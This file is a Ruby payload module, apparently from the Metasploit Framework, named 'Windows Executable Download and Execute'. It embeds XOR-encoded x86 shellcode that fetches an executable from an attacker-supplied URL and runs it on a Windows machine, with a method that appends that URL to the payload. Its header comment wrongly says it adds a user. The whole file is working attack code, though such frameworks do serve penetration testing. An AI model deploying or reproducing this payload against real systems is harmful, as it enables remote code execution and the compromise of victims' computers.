require 'msf/core'
require 'msf/core/payload/windows/exec'

module Msf
module Payloads
module Singles
module Windows

###
#
# Extends the Exec payload to add a new user.
#
###
module DownloadExec
	
	include Msf::Payload::Windows
	include Msf::Payload::Single

	def initialize(info = {})
		super(update_info(info,
			'Name'          => 'Windows Executable Download and Execute',
			'Version'       => '$Revision: 3534 $',
			'Description'   => 'Download an EXE from a HTTP URL and execute it',
			'Authors'       => [ 'lion[at]cnhonker.com', 'pita[at]mail.com' ],
			'License'       => BSD_LICENSE,
			'Platform'      => 'win',
			'Arch'          => ARCH_X86,
			'Privileged'    => false,
			'Payload'       => 
			{
				'Offsets' => { },
				'Payload' =>
					"\xEB\x10\x5A\x4A\x33\xC9\x66\xB9\x3C\x01\x80\x34\x0A\x99\xE2\xFA"+
					"\xEB\x05\xE8\xEB\xFF\xFF\xFF"+
					"\x70\x4C\x99\x99\x99\xC3\xFD\x38\xA9\x99\x99\x99\x12\xD9\x95\x12"+
					"\xE9\x85\x34\x12\xD9\x91\x12\x41\x12\xEA\xA5\x12\xED\x87\xE1\x9A"+
					"\x6A\x12\xE7\xB9\x9A\x62\x12\xD7\x8D\xAA\x74\xCF\xCE\xC8\x12\xA6"+
					"\x9A\x62\x12\x6B\xF3\x97\xC0\x6A\x3F\xED\x91\xC0\xC6\x1A\x5E\x9D"+
					"\xDC\x7B\x70\xC0\xC6\xC7\x12\x54\x12\xDF\xBD\x9A\x5A\x48\x78\x9A"+
					"\x58\xAA\x50\xFF\x12\x91\x12\xDF\x85\x9A\x5A\x58\x78\x9B\x9A\x58"+
					"\x12\x99\x9A\x5A\x12\x63\x12\x6E\x1A\x5F\x97\x12\x49\xF3\x9D\xC0"+
					"\x71\xC9\x99\x99\x99\x1A\x5F\x94\xCB\xCF\x66\xCE\x65\xC3\x12\x41"+
					"\xF3\x98\xC0\x71\xA4\x99\x99\x99\x1A\x5F\x8A\xCF\xDF\x19\xA7\x19"+
					"\xEC\x63\x19\xAF\x19\xC7\x1A\x75\xB9\x12\x45\xF3\xB9\xCA\x66\xCE"+
					"\x75\x5E\x9D\x9A\xC5\xF8\xB7\xFC\x5E\xDD\x9A\x9D\xE1\xFC\x99\x99"+
					"\xAA\x59\xC9\xC9\xCA\xCF\xC9\x66\xCE\x65\x12\x45\xC9\xCA\x66\xCE"+
					"\x69\xC9\x66\xCE\x6D\xAA\x59\x35\x1C\x59\xEC\x60\xC8\xCB\xCF\xCA"+
					"\x66\x4B\xC3\xC0\x32\x7B\x77\xAA\x59\x5A\x71\xBF\x66\x66\x66\xDE"+
					"\xFC\xED\xC9\xEB\xF6\xFA\xD8\xFD\xFD\xEB\xFC\xEA\xEA\x99\xDE\xFC"+
					"\xED\xCA\xE0\xEA\xED\xFC\xF4\xDD\xF0\xEB\xFC\xFA\xED\xF6\xEB\xE0"+
					"\xD8\x99\xCE\xF0\xF7\xDC\xE1\xFC\xFA\x99\xDC\xE1\xF0\xED\xCD\xF1"+
					"\xEB\xFC\xF8\xFD\x99\xD5\xF6\xF8\xFD\xD5\xF0\xFB\xEB\xF8\xEB\xE0"+
					"\xD8\x99\xEC\xEB\xF5\xF4\xF6\xF7\x99\xCC\xCB\xD5\xDD\xF6\xEE\xF7"+
					"\xF5\xF6\xF8\xFD\xCD\xF6\xDF\xF0\xF5\xFC\xD8\x99"	
			}
			))
			
		# EXITFUNC is not supported :/
		deregister_options('EXITFUNC')

		# Register command execution options
		register_options(
			[
				OptString.new('URL', [ true, "The pre-encoded URL to the executable" ])
			], Msf::Payloads::Singles::Windows::DownloadExec)
	end

	#
	# Constructs the payload
	#
	def generate
		return super + (datastore['URL'] || '') + "\x80"
	end

end

end end end end
